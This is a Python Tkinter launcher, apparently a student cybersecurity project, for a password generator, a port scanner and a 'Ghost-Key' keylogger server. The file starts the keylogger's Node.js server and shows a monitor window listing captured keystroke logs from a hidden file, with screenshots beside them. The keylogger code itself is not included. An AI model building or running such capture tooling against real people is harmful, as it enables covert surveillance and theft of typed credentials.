#!/usr/bin/env python3
"""
SecuKit - Suite de Herramientas de Ciberseguridad
Interfaz principal que integra el Generador de Contraseñas y el Escáner de Puertos.
Materia: Ciberseguridad - 8vo Semestre
"""

import tkinter as tk
from tkinter import scrolledtext
from PIL import Image, ImageTk
import glob
from tkinter import ttk
import subprocess
import sys
import os
import shutil
import webbrowser
import signal

class SecuKitApp:
    # Paleta de colores ciberseguridad
    C = {
        'bg': '#0a0e17', 'panel': '#111827', 'card': '#1a2332',
        'card_hover': '#1f2b3d', 'border': '#2a3a50',
        'cyan': '#00e5ff', 'cyan_dim': '#00838f',
        'green': '#00e676', 'green_dim': '#2e7d32',
        'blue': '#448aff', 'purple': '#b388ff',
        'red': '#ff5252', 'orange': '#ffab40',
        'text': '#e0e8f0', 'text_dim': '#7a8a9e',
        'text_bright': '#ffffff',
    }

    def __init__(self, root):
        self.root = root
        self.root.title("SecuKit — Cybersecurity Toolkit")
        self.root.geometry("1120x660")
        self.root.configure(bg=self.C['bg'])
        self.root.minsize(960, 580)
        self.base_dir = os.path.dirname(os.path.abspath(__file__))
        self.node_proc = None  # Ghost-Key server process
        self._load_logo()
        self._build_ui()
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)

    # ── UI Construction ──────────────────────────────────────────
    def _load_logo(self):
        """Carga el logo del proyecto"""
        logo_path = os.path.join(self.base_dir, "logo.png")
        try:
            img = Image.open(logo_path)
            # Logo para el header (48x48)
            self.logo_img = ImageTk.PhotoImage(img.resize((48, 48), Image.LANCZOS))
            # Icono de ventana (32x32)
            icon = ImageTk.PhotoImage(img.resize((32, 32), Image.LANCZOS))
            self.root.iconphoto(True, icon)
            self._icon_ref = icon  # mantener referencia
        except Exception:
            self.logo_img = None

    def _build_ui(self):
        # Header
        hdr = tk.Frame(self.root, bg=self.C['panel'], height=72)
        hdr.pack(fill=tk.X)
        hdr.pack_propagate(False)

        if self.logo_img:
            tk.Label(hdr, image=self.logo_img, bg=self.C['panel']
                     ).pack(side=tk.LEFT, padx=(24, 8))
        else:
            tk.Label(hdr, text="⬡", font=("Consolas", 28), bg=self.C['panel'],
                     fg=self.C['cyan']).pack(side=tk.LEFT, padx=(24, 8))
        title_box = tk.Frame(hdr, bg=self.C['panel'])
        title_box.pack(side=tk.LEFT)
        tk.Label(title_box, text="SecuKit", font=("Segoe UI", 20, "bold"),
                 bg=self.C['panel'], fg=self.C['text_bright']).pack(anchor=tk.W)
        tk.Label(title_box, text="Cybersecurity Toolkit · 8vo Semestre",
                 font=("Segoe UI", 9), bg=self.C['panel'],
                 fg=self.C['text_dim']).pack(anchor=tk.W)

        # Accent line
        tk.Frame(self.root, bg=self.C['cyan'], height=2).pack(fill=tk.X)

        # Body
        body = tk.Frame(self.root, bg=self.C['bg'])
        body.pack(fill=tk.BOTH, expand=True, padx=36, pady=28)

        tk.Label(body, text="Herramientas disponibles",
                 font=("Segoe UI", 13, "bold"), bg=self.C['bg'],
                 fg=self.C['text']).pack(anchor=tk.W, pady=(0, 16))

        cards = tk.Frame(body, bg=self.C['bg'])
        cards.pack(fill=tk.BOTH, expand=True)
        cards.columnconfigure(0, weight=1)
        cards.columnconfigure(1, weight=1)
        cards.columnconfigure(2, weight=1)

        self._card(cards, 0,
                   icon="🔐", title="Generador de\nContraseñas",
                   desc="Genera contraseñas seguras con\nanálisis de fortaleza y exportación.",
                   tags=["Passwords", "Crypto"],
                   accent=self.C['green'], accent_dim=self.C['green_dim'],
                   cmd=lambda: self._launch("password_generator_gui.py"))

        self._card(cards, 1,
                   icon="🔍", title="Escáner de\nPuertos",
                   desc="Escanea puertos TCP con detección\nde firewall y servicios activos.",
                   tags=["Network", "Recon"],
                   accent=self.C['cyan'], accent_dim=self.C['cyan_dim'],
                   cmd=lambda: self._launch("port_scanner_advanced.py"))

        self._card_node(cards, 2)

        # Status bar
        self.status = tk.Label(self.root, text="▸ Listo",
                               font=("Consolas", 9), bg=self.C['panel'],
                               fg=self.C['text_dim'], anchor=tk.W, padx=16)
        self.status.pack(fill=tk.X, side=tk.BOTTOM)

    # ── Card Widget ──────────────────────────────────────────────
    def _card(self, parent, col, *, icon, title, desc, tags, accent, accent_dim, cmd):
        pad = 5
        wrapper = tk.Frame(parent, bg=self.C['bg'])
        wrapper.grid(row=0, column=col, sticky="nsew", padx=pad, pady=4)
        wrapper.columnconfigure(0, weight=1)
        wrapper.rowconfigure(0, weight=1)

        card = tk.Frame(wrapper, bg=self.C['card'], highlightbackground=self.C['border'],
                        highlightthickness=1, cursor="hand2")
        card.grid(row=0, column=0, sticky="nsew")

        inner = tk.Frame(card, bg=self.C['card'])
        inner.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)

        # Top accent bar
        tk.Frame(inner, bg=accent, height=3, width=40).pack(anchor=tk.W, pady=(0, 12))

        # Icon + Title
        row = tk.Frame(inner, bg=self.C['card'])
        row.pack(anchor=tk.W, fill=tk.X)
        tk.Label(row, text=icon, font=("Segoe UI", 22),
                 bg=self.C['card'], fg=accent).pack(side=tk.LEFT, padx=(0, 8))
        tk.Label(row, text=title, font=("Segoe UI", 13, "bold"),
                 bg=self.C['card'], fg=self.C['text_bright'],
                 justify=tk.LEFT).pack(side=tk.LEFT)

        # Description
        tk.Label(inner, text=desc, font=("Segoe UI", 9),
                 bg=self.C['card'], fg=self.C['text_dim'],
                 justify=tk.LEFT).pack(anchor=tk.W, pady=(8, 12))

        # Tags
        tag_row = tk.Frame(inner, bg=self.C['card'])
        tag_row.pack(anchor=tk.W, pady=(0, 14))
        for t in tags:
            tk.Label(tag_row, text=t, font=("Consolas", 8),
                     bg=accent_dim, fg=self.C['text_bright'],
                     padx=8, pady=2).pack(side=tk.LEFT, padx=(0, 6))

        # Launch button
        btn = tk.Button(inner, text="▶  Ejecutar", font=("Segoe UI", 10, "bold"),
                        bg=accent, fg="#000000", activebackground=accent_dim,
                        activeforeground="#ffffff", border=0, padx=16, pady=6,
                        cursor="hand2", command=cmd)
        btn.pack(anchor=tk.W)

        # Hover effects
        for w in (card, inner, row):
            w.bind("<Enter>", lambda e, c=card: c.configure(
                bg=self.C['card_hover'], highlightbackground=accent))
            w.bind("<Leave>", lambda e, c=card: c.configure(
                bg=self.C['card'], highlightbackground=self.C['border']))
            w.bind("<Button-1>", lambda e, fn=cmd: fn())

    # ── Ghost-Key Card (Node.js server) ──────────────────────────
    def _card_node(self, parent, col):
        accent = self.C['purple']
        accent_dim = '#6a1b9a'

        wrapper = tk.Frame(parent, bg=self.C['bg'])
        wrapper.grid(row=0, column=col, sticky="nsew", padx=5, pady=4)
        wrapper.columnconfigure(0, weight=1)
        wrapper.rowconfigure(0, weight=1)

        card = tk.Frame(wrapper, bg=self.C['card'], highlightbackground=self.C['border'],
                        highlightthickness=1, cursor="hand2")
        card.grid(row=0, column=0, sticky="nsew")

        inner = tk.Frame(card, bg=self.C['card'])
        inner.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)

        tk.Frame(inner, bg=accent, height=3, width=40).pack(anchor=tk.W, pady=(0, 12))

        row = tk.Frame(inner, bg=self.C['card'])
        row.pack(anchor=tk.W, fill=tk.X)
        tk.Label(row, text="👻", font=("Segoe UI", 22),
                 bg=self.C['card'], fg=accent).pack(side=tk.LEFT, padx=(0, 8))
        tk.Label(row, text="Ghost-Key\nKeylogger", font=("Segoe UI", 13, "bold"),
                 bg=self.C['card'], fg=self.C['text_bright'],
                 justify=tk.LEFT).pack(side=tk.LEFT)

        tk.Label(inner, text="Servidor de captura de datos\ncon keylogger y screenshots.",
                 font=("Segoe UI", 9), bg=self.C['card'],
                 fg=self.C['text_dim'], justify=tk.LEFT
                 ).pack(anchor=tk.W, pady=(8, 12))

        tag_row = tk.Frame(inner, bg=self.C['card'])
        tag_row.pack(anchor=tk.W, pady=(0, 10))
        for t in ["Keylogger", "Node.js"]:
            tk.Label(tag_row, text=t, font=("Consolas", 8),
                     bg=accent_dim, fg=self.C['text_bright'],
                     padx=8, pady=2).pack(side=tk.LEFT, padx=(0, 6))

        # Status indicator
        self.node_status = tk.Label(inner, text="● Detenido", font=("Consolas", 9),
                                    bg=self.C['card'], fg=self.C['red'])
        self.node_status.pack(anchor=tk.W, pady=(0, 10))

        # Buttons
        btn_frame = tk.Frame(inner, bg=self.C['card'])
        btn_frame.pack(anchor=tk.W, fill=tk.X)

        self.btn_start = tk.Button(btn_frame, text="▶ Iniciar", font=("Segoe UI", 10, "bold"),
                                   bg=accent, fg="#000000", border=0, padx=14, pady=6,
                                   cursor="hand2", command=self._launch_node)
        self.btn_start.pack(side=tk.LEFT, padx=(0, 6))

        self.btn_stop = tk.Button(btn_frame, text="⏹ Detener", font=("Segoe UI", 10, "bold"),
                                  bg=self.C['red'], fg="#ffffff", border=0, padx=14, pady=6,
                                  cursor="hand2", command=self._stop_node, state=tk.DISABLED)
        self.btn_stop.pack(side=tk.LEFT, padx=(0, 6))

        self.btn_open = tk.Button(btn_frame, text="🌐", font=("Segoe UI", 10),
                                  bg=self.C['card_hover'], fg=self.C['text'],
                                  border=0, padx=8, pady=6,
                                  cursor="hand2", command=self._open_browser,
                                  state=tk.DISABLED)
        self.btn_open.pack(side=tk.LEFT, padx=(0, 6))

        self.btn_monitor = tk.Button(btn_frame, text="📊", font=("Segoe UI", 10),
                                     bg=self.C['card_hover'], fg=self.C['text'],
                                     border=0, padx=8, pady=6,
                                     cursor="hand2", command=self._open_monitor)
        self.btn_monitor.pack(side=tk.LEFT)

        # Hover effects (purple highlight)
        for w in (card, inner, row):
            w.bind("<Enter>", lambda e, c=card: c.configure(
                bg=self.C['card_hover'], highlightbackground=accent))
            w.bind("<Leave>", lambda e, c=card: c.configure(
                bg=self.C['card'], highlightbackground=self.C['border']))

    # ── Launch Python Tool ────────────────────────────────────────
    def _launch(self, script):
        path = os.path.join(self.base_dir, script)
        if not os.path.isfile(path):
            self.status.config(text=f"✗ No encontrado: {script}", fg=self.C['red'])
            return
        self.status.config(text=f"▸ Abriendo {script}…", fg=self.C['cyan'])
        self.root.update()
        try:
            subprocess.Popen([sys.executable, path])
            self.root.after(1500, lambda: self.status.config(
                text="▸ Listo", fg=self.C['text_dim']))
        except Exception as e:
            self.status.config(text=f"✗ Error: {e}", fg=self.C['red'])

    # ── Ghost-Key Node.js Server ─────────────────────────────────
    def _read_env(self):
        """Lee el archivo .env del keylogger para obtener IP y puerto"""
        env = {"SERVER_IP": "localhost", "PORT": "3000"}
        env_path = os.path.join(self.base_dir, "keylogger", ".env")
        if os.path.isfile(env_path):
            with open(env_path, "r") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#") and "=" in line:
                        key, val = line.split("=", 1)
                        env[key.strip()] = val.strip()
        return env

    def _find_node(self):
        """Busca el binario de node en PATH y en rutas comunes de nvm/fnm"""
        # 1. Intentar con PATH normal
        node = shutil.which("node")
        if node:
            return node, os.path.dirname(node)

        # 2. Buscar en nvm (ubicación más común)
        home = os.path.expanduser("~")
        nvm_dir = os.path.join(home, ".nvm", "versions", "node")
        if os.path.isdir(nvm_dir):
            versions = sorted(os.listdir(nvm_dir), reverse=True)
            for v in versions:
                candidate = os.path.join(nvm_dir, v, "bin", "node")
                if os.path.isfile(candidate):
                    return candidate, os.path.join(nvm_dir, v, "bin")

        # 3. Buscar en fnm
        fnm_dir = os.path.join(home, ".local", "share", "fnm", "node-versions")
        if os.path.isdir(fnm_dir):
            for v in sorted(os.listdir(fnm_dir), reverse=True):
                candidate = os.path.join(fnm_dir, v, "installation", "bin", "node")
                if os.path.isfile(candidate):
                    return candidate, os.path.dirname(candidate)

        return None, None

    def _launch_node(self):
        keylogger_dir = os.path.join(self.base_dir, "keylogger")
        server_js = os.path.join(keylogger_dir, "server.js")

        if not os.path.isfile(server_js):
            self.status.config(text="✗ keylogger/server.js no encontrado", fg=self.C['red'])
            return

        node_bin, node_dir = self._find_node()
        if not node_bin:
            self.status.config(text="✗ Node.js no encontrado (ni en PATH ni en nvm)", fg=self.C['red'])
            return

        # Build env with node in PATH so npm also works
        proc_env = os.environ.copy()
        proc_env["PATH"] = node_dir + os.pathsep + proc_env.get("PATH", "")

        # Check node_modules
        if not os.path.isdir(os.path.join(keylogger_dir, "node_modules")):
            npm_bin = os.path.join(node_dir, "npm")
            if not os.path.isfile(npm_bin):
                npm_bin = shutil.which("npm") or "npm"
            self.status.config(text="▸ Instalando dependencias (npm install)…", fg=self.C['orange'])
            self.root.update()
            subprocess.run([npm_bin, "install"], cwd=keylogger_dir, env=proc_env,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # Read .env config
        env_vars = self._read_env()
        self._node_ip = env_vars.get("SERVER_IP", "localhost")
        self._node_port = env_vars.get("PORT", "3000")

        try:
            self.node_proc = subprocess.Popen(
                [node_bin, server_js], cwd=keylogger_dir, env=proc_env,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            # Wait briefly to check if process crashes immediately
            import time
            time.sleep(0.8)
            if self.node_proc.poll() is not None:
                _, stderr = self.node_proc.communicate()
                err_msg = stderr.decode(errors="replace").strip()[:100]
                self.status.config(
                    text=f"✗ Ghost-Key falló: {err_msg}", fg=self.C['red'])
                self.node_proc = None
                return

            self.node_status.config(
                text=f"● Activo — {self._node_ip}:{self._node_port}",
                fg=self.C['green'])
            self.btn_start.config(state=tk.DISABLED)
            self.btn_stop.config(state=tk.NORMAL)
            self.btn_open.config(state=tk.NORMAL)
            self.status.config(
                text=f"▸ Ghost-Key iniciado en http://{self._node_ip}:{self._node_port}",
                fg=self.C['purple'])
        except Exception as e:
            self.status.config(text=f"✗ Error al iniciar Ghost-Key: {e}", fg=self.C['red'])

    def _stop_node(self):
        if self.node_proc:
            self.node_proc.terminate()
            try:
                self.node_proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                self.node_proc.kill()
            self.node_proc = None
        self.node_status.config(text="● Detenido", fg=self.C['red'])
        self.btn_start.config(state=tk.NORMAL)
        self.btn_stop.config(state=tk.DISABLED)
        self.btn_open.config(state=tk.DISABLED)
        self.status.config(text="▸ Ghost-Key detenido", fg=self.C['text_dim'])

    def _open_browser(self):
        ip = getattr(self, '_node_ip', 'localhost')
        port = getattr(self, '_node_port', '3000')
        webbrowser.open(f"http://{ip}:{port}")

    # ── Monitor Window ───────────────────────────────────────────
    def _open_monitor(self):
        """Abre ventana de monitoreo con logs y capturas"""
        mon = tk.Toplevel(self.root)
        mon.title("👻 Ghost-Key — Monitor")
        mon.geometry("960x700")
        mon.configure(bg=self.C['bg'])
        mon.minsize(700, 500)

        # Header
        hdr = tk.Frame(mon, bg=self.C['panel'], height=50)
        hdr.pack(fill=tk.X)
        hdr.pack_propagate(False)
        tk.Label(hdr, text="👻 Ghost-Key Monitor", font=("Segoe UI", 14, "bold"),
                 bg=self.C['panel'], fg=self.C['purple']).pack(side=tk.LEFT, padx=16)
        status_lbl = tk.Label(hdr, text="", font=("Consolas", 9),
                              bg=self.C['panel'], fg=self.C['text_dim'])
        status_lbl.pack(side=tk.RIGHT, padx=16)
        tk.Frame(mon, bg=self.C['purple'], height=2).pack(fill=tk.X)

        # ── Paned window: Logs (left) + Screenshots (right) ──
        paned = tk.PanedWindow(mon, orient=tk.HORIZONTAL, bg=self.C['bg'],
                               sashwidth=4, sashrelief=tk.FLAT)
        paned.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # LEFT: Logs panel
        log_frame = tk.Frame(paned, bg=self.C['card'])
        tk.Label(log_frame, text="📝 Logs capturados", font=("Segoe UI", 11, "bold"),
                 bg=self.C['card'], fg=self.C['text']).pack(anchor=tk.W, padx=12, pady=(10, 6))
        log_text = scrolledtext.ScrolledText(
            log_frame, font=("Consolas", 9), wrap=tk.WORD, state=tk.DISABLED,
            bg='#0d1117', fg='#c9d1d9', insertbackground='#c9d1d9',
            selectbackground=self.C['purple'], relief=tk.FLAT, borderwidth=0
        )
        log_text.pack(fill=tk.BOTH, expand=True, padx=8, pady=(0, 8))
        log_text.tag_configure("ts", foreground="#7a8a9e")
        log_text.tag_configure("field", foreground=self.C['cyan'])
        log_text.tag_configure("value", foreground=self.C['green'])
        paned.add(log_frame, minsize=350)

        # RIGHT: Screenshots panel
        ss_frame = tk.Frame(paned, bg=self.C['card'])
        tk.Label(ss_frame, text="📸 Capturas de pantalla", font=("Segoe UI", 11, "bold"),
                 bg=self.C['card'], fg=self.C['text']).pack(anchor=tk.W, padx=12, pady=(10, 6))

        # Scrollable canvas for screenshots
        ss_canvas = tk.Canvas(ss_frame, bg='#0d1117', highlightthickness=0)
        ss_scrollbar = ttk.Scrollbar(ss_frame, orient=tk.VERTICAL, command=ss_canvas.yview)
        ss_inner = tk.Frame(ss_canvas, bg='#0d1117')
        ss_inner.bind("<Configure>", lambda e: ss_canvas.configure(scrollregion=ss_canvas.bbox("all")))
        ss_canvas.create_window((0, 0), window=ss_inner, anchor="nw")
        ss_canvas.configure(yscrollcommand=ss_scrollbar.set)
        ss_canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(8, 0), pady=(0, 8))
        ss_scrollbar.pack(side=tk.RIGHT, fill=tk.Y, pady=(0, 8))
        paned.add(ss_frame, minsize=300)

        # Store references for refresh
        mon._log_text = log_text
        mon._ss_inner = ss_inner
        mon._ss_canvas = ss_canvas
        mon._status_lbl = status_lbl
        mon._img_refs = []  # keep references to avoid GC
        mon._last_log_size = 0
        mon._last_ss_count = 0

        # Start auto-refresh
        self._refresh_monitor(mon)

    def _refresh_monitor(self, mon):
        """Actualiza logs y capturas cada 2 segundos"""
        if not mon.winfo_exists():
            return

        keylogger_dir = os.path.join(self.base_dir, "keylogger")
        log_file = os.path.join(keylogger_dir, ".logs_db.txt")
        ss_dir = os.path.join(keylogger_dir, "capturas")

        # ── Refresh Logs ──
        try:
            if os.path.isfile(log_file):
                current_size = os.path.getsize(log_file)
                if current_size != mon._last_log_size:
                    mon._last_log_size = current_size
                    with open(log_file, "r", encoding="utf-8", errors="replace") as f:
                        lines = f.readlines()
                    log_w = mon._log_text
                    log_w.config(state=tk.NORMAL)
                    log_w.delete("1.0", tk.END)
                    for line in lines:
                        # Parse: [timestamp] Campo: X | Valor: Y
                        if "] Campo:" in line and "| Valor:" in line:
                            ts_end = line.index("]")+1
                            mid = line.index("| Valor:")
                            log_w.insert(tk.END, line[:ts_end] + " ", "ts")
                            log_w.insert(tk.END, line[ts_end:mid].strip() + "  ", "field")
                            log_w.insert(tk.END, line[mid:].strip() + "\n", "value")
                        else:
                            log_w.insert(tk.END, line)
                    log_w.see(tk.END)
                    log_w.config(state=tk.DISABLED)
        except Exception:
            pass

        # ── Refresh Screenshots ──
        try:
            if os.path.isdir(ss_dir):
                files = sorted(glob.glob(os.path.join(ss_dir, "snap_*")),
                               key=os.path.getmtime, reverse=True)
                if len(files) != mon._last_ss_count:
                    mon._last_ss_count = len(files)
                    # Clear old thumbnails
                    for w in mon._ss_inner.winfo_children():
                        w.destroy()
                    mon._img_refs.clear()

                    if not files:
                        tk.Label(mon._ss_inner, text="Sin capturas aún…",
                                 font=("Segoe UI", 9), bg='#0d1117',
                                 fg=self.C['text_dim']).pack(pady=20)
                    else:
                        for fpath in files[:50]:  # max 50 thumbnails
                            try:
                                img = Image.open(fpath)
                                img.thumbnail((280, 200), Image.LANCZOS)
                                photo = ImageTk.PhotoImage(img)
                                mon._img_refs.append(photo)

                                item = tk.Frame(mon._ss_inner, bg='#1a2332',
                                                highlightbackground=self.C['border'],
                                                highlightthickness=1)
                                item.pack(fill=tk.X, padx=4, pady=4)
                                tk.Label(item, image=photo, bg='#1a2332'
                                         ).pack(padx=6, pady=(6, 2))
                                fname = os.path.basename(fpath)
                                tk.Label(item, text=fname, font=("Consolas", 7),
                                         bg='#1a2332', fg=self.C['text_dim']
                                         ).pack(pady=(0, 6))
                            except Exception:
                                continue
                    mon._ss_canvas.configure(scrollregion=mon._ss_canvas.bbox("all"))
        except Exception:
            pass

        # Status
        log_count = mon._last_log_size
        ss_count = mon._last_ss_count
        mon._status_lbl.config(
            text=f"Logs: {log_count} bytes  |  Capturas: {ss_count}")

        # Schedule next refresh
        mon.after(2000, lambda: self._refresh_monitor(mon))

    def _on_close(self):
        """Limpieza al cerrar la ventana"""
        if self.node_proc:
            self.node_proc.terminate()
            try:
                self.node_proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                self.node_proc.kill()
        self.root.destroy()


if __name__ == "__main__":
    root = tk.Tk()
    SecuKitApp(root)
    root.mainloop()
